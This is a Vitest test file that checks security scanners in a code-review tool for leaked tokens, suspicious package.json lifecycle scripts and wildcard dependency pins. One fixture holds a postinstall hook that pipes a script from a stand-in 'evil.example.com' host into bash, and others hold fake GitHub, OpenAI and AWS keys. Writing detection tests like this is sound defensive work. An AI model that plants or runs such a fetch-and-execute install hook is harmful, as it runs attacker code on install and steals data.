import { describe, expect, it } from 'vitest';
import { scanDependenciesInDiff } from '../../src/security/scanners/dependency-scanner.js';
import { runSecurityScanners } from '../../src/security/scanners/scanner-engine.js';
import { scanSecretsInDiff } from '../../src/security/scanners/secret-scanner.js';
import type { SecurityContext } from '../../src/security/types.js';

describe('SecurityScanners', () => {
	it('detects exposed tokens and credentials in diff patches', () => {
		const files = [
			{
				filename: 'src/config.ts',
				patch: `@@ -10,2 +10,4 @@
 const port = 3000;
+const ghToken = "ghp_1234567890abcdef1234567890abcdef";
+const openAiKey = "sk-proj-1234567890abcdef1234567890abcdef";
`,
			},
		];
		const findings = scanSecretsInDiff(files);
		expect(findings.length).toBeGreaterThanOrEqual(2);
		expect(findings.some((f) => f.title.includes('GitHub Token'))).toBe(true);
		expect(findings.some((f) => f.title.includes('OpenAI'))).toBe(true);
		expect(findings[0].severity).toBe('critical');
	});

	it('detects suspicious lifecycle scripts in package.json diffs', () => {
		const files = [
			{
				filename: 'package.json',
				patch: `@@ -5,2 +5,4 @@
   "scripts": {
+    "postinstall": "curl -s https://evil.example.com/steal.sh | bash",
     "test": "vitest"
   }`,
			},
		];
		const findings = scanDependenciesInDiff(files);
		expect(findings).toHaveLength(1);
		expect(findings[0].title).toContain('Lifecycle Script');
		expect(findings[0].severity).toBe('high');
	});

	it('detects wildcard dependency pins in package.json', () => {
		const files = [
			{
				filename: 'package.json',
				patch: `@@ -15,2 +15,4 @@
   "dependencies": {
+    "some-lib": "*",
     "react": "^18.0.0"
   }`,
			},
		];
		const findings = scanDependenciesInDiff(files);
		expect(findings).toHaveLength(1);
		expect(findings[0].title).toContain('Wildcard Dependency');
		expect(findings[0].severity).toBe('medium');
	});

	it('runs unified security scanner engine and returns structured metadata', async () => {
		const ctx: SecurityContext = {
			repositoryPath: process.cwd(),
			owner: 'org',
			repo: 'repo',
			changedFiles: [
				{
					filename: 'src/api.ts',
					status: 'modified',
					additions: 1,
					deletions: 0,
					patch: '+const key = "AKIAIOSFODNN7EXAMPLE";',
				},
			],
			options: {
				mode: 'security',
				profile: 'diff',
				minSeverity: 'medium',
				failOn: 'critical',
				confirmFindings: true,
				inlineComments: true,
				stickyComment: true,
				generateSarif: true,
				maxFindings: 20,
				riskThreshold: 'high',
			},
		};

		const res = await runSecurityScanners(ctx);
		expect(res.executions.length).toBeGreaterThanOrEqual(3);
		expect(res.findings.length).toBeGreaterThanOrEqual(1);
		expect(res.findings[0].title).toContain('AWS Access Key');
	});
});
